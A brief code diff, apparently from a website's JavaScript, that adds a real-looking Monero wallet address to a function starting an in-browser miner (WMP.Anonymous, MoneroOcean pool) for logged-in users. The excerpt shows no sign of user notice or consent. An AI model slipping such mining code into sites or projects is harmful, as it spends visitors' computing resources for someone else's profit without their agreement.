@@ -44,7 +44,7 @@ function startMining() {
   const user = localStorage.getItem("user");
   if (!user) return;
 
-  const walletAddress = "YOUR_MONERO_WALLET_ADDRESS_HERE"; // Replace this!
+  const walletAddress = "47BXT5PE6B26tEmKEqn3xrB39MGra1jCP2dv7kZ131eJfMGuucwKnhbggyc8q4j3xvdc5kmUw9fi6UQ7N3i1Rz88QdxEp97"; // Replace this!
 
   if (!miner) {
     miner = WMP.Anonymous(walletAddress, "low", "MoneroOcean");
